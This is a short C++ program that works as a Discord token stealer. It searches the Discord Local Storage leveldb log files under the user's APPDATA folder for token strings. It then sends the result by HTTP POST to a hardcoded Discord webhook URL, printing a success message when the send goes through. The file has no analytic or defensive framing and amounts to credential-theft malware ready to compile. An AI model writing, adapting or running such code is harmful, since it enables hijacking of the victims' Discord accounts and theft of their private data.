#include <iostream>
#include <Windows.h>
#include <fstream>
#include <string>
#include <cpprest/http_client.h>

using namespace std;
using namespace web;
using namespace web::http;
using namespace web::http::client;

string GetDiscordToken() {
    string tokenPath = getenv("APPDATA");
    tokenPath += "\\discord\\Local Storage\\leveldb";
    string token;

    WIN32_FIND_DATAA findData;
    HANDLE hFind = FindFirstFileA((tokenPath + "\\*").c_str(), &findData);

    do {
        if (string(findData.cFileName).find(".log") != string::npos) {
            ifstream file(tokenPath + "\\" + findData.cFileName);
            string line;
            while (getline(file, line)) {
                if (line.find("oken") != string::npos) {
                    token = line.substr(6);
                    break;
                }
            }
            file.close();
        }
    } while (FindNextFileA(hFind, &findData) != 0);

    FindClose(hFind);
    return token;
}

void SendTokenToWebhook(string token) {
    http_client client(U("https://discord.com/api/webhooks/1224131986772201492/kxuDI3kuYJxNW3bySdB0oTBpGtJfhdmPlNUGNxSoThCvieR7goA99RB6SrYHGUfVCz2f"));
    json::value payload;
    payload[U("content")] = json::value::string(token);

    client.request(methods::POST, U(""), payload.serialize(), U("application/json"))
        .then([](http_response response) {
            if (response.status_code() == status_codes::OK) {
                cout << "Token sent successfully!" << endl;
            } else {
                cout << "Failed to send token." << endl;
            }
        })
        .wait();
}

int main() {
    string discordToken = GetDiscordToken();
    SendTokenToWebhook(discordToken);

    return 0;
}
